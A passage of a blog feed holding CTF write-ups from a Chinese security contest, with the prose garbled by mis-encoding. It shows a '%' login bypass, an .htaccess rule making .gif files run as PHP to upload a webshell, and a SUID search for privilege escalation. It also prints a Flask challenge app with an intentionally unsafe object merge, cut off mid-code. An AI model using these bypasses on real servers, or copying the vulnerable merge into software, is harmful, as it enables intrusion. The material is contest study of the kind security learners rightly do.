alt="image-20240910232355400"></p><p>æœ‰æŠ¥é”€å…¬è´¹å‡ºå·®ï¼ŒæŒºå¥½ï¼ˆï¼ˆ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;é¦–æ¬¡é‡ä¸Šå®‰æ’æ¸—é€ï¼Œdockerç¯å¢ƒå‘½ä»¤é™åˆ¶ï¼Œæ²¡å‘vpså›°éš¾é‡é‡ï¼Œæ‹¼å°½å…¨åŠ›ä¹Ÿæ— æ³•æˆ˜èƒœ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2024/09/10/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240911164742109.png&quot; alt=&quot;image-20240911164742109&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="çº¿ä¸‹èµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>ç¬¬å››å±Šâ€œé•¿åŸæ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›æš¨äº¬æ´¥å†€ç½‘ç»œå®‰å…¨æŠ€èƒ½ç«èµ›ï¼ˆåˆèµ›ï¼‰</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/</id>
    <published>2024-09-08T01:54:21.000Z</published>
    <updated>2024-09-13T09:43:55.176Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/26g_S3des0YHp3uAM29UqA">https://mp.weixin.qq.com/s/26g_S3des0YHp3uAM29UqA</a></p><span id="more"></span><hr><h1 id="SQLUP"><a href="#SQLUP" class="headerlink" title="SQLUP"></a>SQLUP</h1><p>è¿›å»æ˜¯ä¸€ä¸ªç™»å½•æ¡†</p><p>éœ€è¦POSTä¼ å…¥å‚æ•°usernameå’Œpassword</p><p>f12å‘ç°hintï¼š<code>The developer likes to use fuzzy matching in the login module.</code></p><p>æµ‹è¯•å‘ç°å­˜åœ¨è¿‡æ»¤è¿”å› Illegal Input Detected! ï¼Œfuzzä¸€ä¸‹çœ‹çœ‹è¿‡æ»¤äº†ä»€ä¹ˆ</p><p><img src="/blog/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/image-20240908100216961.png" alt="image-20240908100216961"></p><p>ç»“åˆhintï¼Œç›´æ¥å°è¯•ç”¨<code>%</code>æ¨¡ç³ŠåŒ¹é…</p><p><img src="/blog/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/image-20240908100825312.png" alt="image-20240908100825312"></p><p>è¿›å»ä¹‹åæœ‰ä¸€ä¸ªä¸Šä¼ å¤´åƒçš„åŠŸèƒ½</p><p>å°è¯•ä¼ é©¬ï¼Œå‘ç°æ–‡ä»¶åè¿‡æ»¤äº†pï¼Œå…ˆéšä¾¿ä¸Šä¼ ä¸ªtxt</p><p><img src="/blog/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/image-20240908101508568.png" alt="image-20240908101508568"></p><p>å‘ç°ä¸Šä¼ ä½ç½®åœ¨ uploads&#x2F; ä¸‹</p><p>ä¼ .htaccessæ–‡ä»¶å³å¯ç»•è¿‡</p><pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">AddType application&#x2F;x-httpd-php .gif<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/image-20240908102230008.png" alt="image-20240908102230008"></p><p>å‘ç°flagæ²¡æœ‰è¯»å–çš„æƒé™ï¼Œå°è¯•findææƒ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/image-20240908102332835.png" alt="image-20240908102332835"></p><p>å‘ç° tac èƒ½ç”¨ï¼Œç›´æ¥è¯»å–flagå³å¯</p><p><img src="/blog/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/image-20240908102453739.png" alt="image-20240908102453739"></p><hr><h1 id="CandyShopï¼ˆå¤ç°ï¼‰"><a href="#CandyShopï¼ˆå¤ç°ï¼‰" class="headerlink" title="CandyShopï¼ˆå¤ç°ï¼‰"></a>CandyShopï¼ˆå¤ç°ï¼‰</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> datetime<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> session<span class="token punctuation">,</span> make_response<span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token punctuation">,</span> PasswordField<span class="token punctuation">,</span> SubmitField<span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> DataRequired<span class="token punctuation">,</span> Length<span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm<span class="token keyword">import</span> reapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'xxxxxxx'</span><span class="token keyword">class</span> <span class="token class-name">RegistrationForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'Username'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Length<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span><span class="token string">'Password'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Length<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'Register'</span><span class="token punctuation">)</span>    <span class="token keyword">class</span> <span class="token class-name">LoginForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'Username'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Length<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span><span class="token string">'Password'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Length<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'Login'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Candy</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> image<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>image <span class="token operator">=</span> image<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username        self<span class="token punctuation">.</span>password <span class="token operator">=</span> password    <span class="token keyword">def</span> <span class="token function">verify_password</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>username<span class="token operator">==</span>username<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>password<span class="token operator">==</span>password<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Admin</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">""</span>        self<span class="token punctuation">.</span>identity <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">sanitize_inventory_sold</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[a-zA-Z_]'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>candies <span class="token operator">=</span> <span class="token punctuation">[</span>Candy<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"Lollipop"</span><span class="token punctuation">,</span> image<span class="token operator">=</span><span class="token string">"images/candy1.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    Candy<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"Chocolate Bar"</span><span class="token punctuation">,</span> image<span class="token operator">=</span><span class="token string">"images/candy2.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    Candy<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"Gummy Bears"</span><span class="token punctuation">,</span> image<span class="token operator">=</span><span class="token string">"images/candy3.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>admin_user <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> RegistrationForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">,</span> password<span class="token operator">=</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> u <span class="token keyword">in</span> users<span class="token punctuation">:</span>            <span class="token keyword">if</span> u<span class="token punctuation">.</span>verify_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">,</span> form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>                session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data                session<span class="token punctuation">[</span><span class="token string">'identity'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"guest"</span>                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'home'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>inventory <span class="token operator">=</span> <span class="token number">500</span>sold <span class="token operator">=</span> <span class="token number">0</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> inventory<span class="token punctuation">,</span> sold    message <span class="token operator">=</span> <span class="token boolean">None</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    identity <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'identity'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> username<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> sold <span class="token operator">>=</span> <span class="token number">10</span> <span class="token keyword">and</span> sold <span class="token operator">&lt;</span> <span class="token number">500</span><span class="token punctuation">:</span>        sold <span class="token operator">=</span> <span class="token number">0</span>        inventory <span class="token operator">=</span> <span class="token number">500</span>        message <span class="token operator">=</span> <span class="token string">"But you have bought too many candies!"</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'home.html'</span><span class="token punctuation">,</span> inventory<span class="token operator">=</span>inventory<span class="token punctuation">,</span> sold<span class="token operator">=</span>sold<span class="token punctuation">,</span> message<span class="token operator">=</span>message<span class="token punctuation">,</span> candies<span class="token operator">=</span>candies<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        action <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> action <span class="token operator">==</span> <span class="token string">"buy_candy"</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> inventory <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                inventory <span class="token operator">-=</span> <span class="token number">3</span>                sold <span class="token operator">+=</span> <span class="token number">3</span>            <span class="token keyword">if</span> inventory <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                message <span class="token operator">=</span> <span class="token string">"All candies are sold out!"</span>            <span class="token keyword">if</span> sold <span class="token operator">>=</span> <span class="token number">500</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'secret.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>                    message <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'home.html'</span><span class="token punctuation">,</span> inventory<span class="token operator">=</span>inventory<span class="token punctuation">,</span> sold<span class="token operator">=</span>sold<span class="token punctuation">,</span> message<span class="token operator">=</span>message<span class="token punctuation">,</span> candies<span class="token operator">=</span>candies<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    identity <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'identity'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> identity <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    admin <span class="token operator">=</span> Admin<span class="token punctuation">(</span><span class="token punctuation">)</span>    merge<span class="token punctuation">(</span>session<span class="token punctuation">,</span>admin<span class="token punctuation">)</span>    admin_user<span class="token punctuation">.</span>append<span class="token punctuation">(</span>admin<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span> view<span class="token operator">=</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin/view_candies'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view_candies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    identity <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'identity'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> identity <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span> view<span class="token operator">=</span><span class="token string">'candies'</span><span class="token punctuation">,</span> candies<span class="token operator">=</span>candies<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin/add_candy'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_candy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    identity <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'identity'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> identity <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    candy_name <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>    candy_image <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> candy_name <span class="token keyword">and</span> candy_image<span class="token punctuation">:</span>        new_candy <span class="token operator">=</span> Candy<span class="token punctuation">(</span>name<span class="token operator">=</span>candy_name<span class="token punctuation">,</span> image<span class="token operator">=</span>candy_image<span class="token punctuation">)</span>        candies<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_candy<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span> view<span class="token operator">=</span><span class="token string">'add_candy'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin/view_inventory'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view_inventory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    identity <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'identity'</span><span class="token 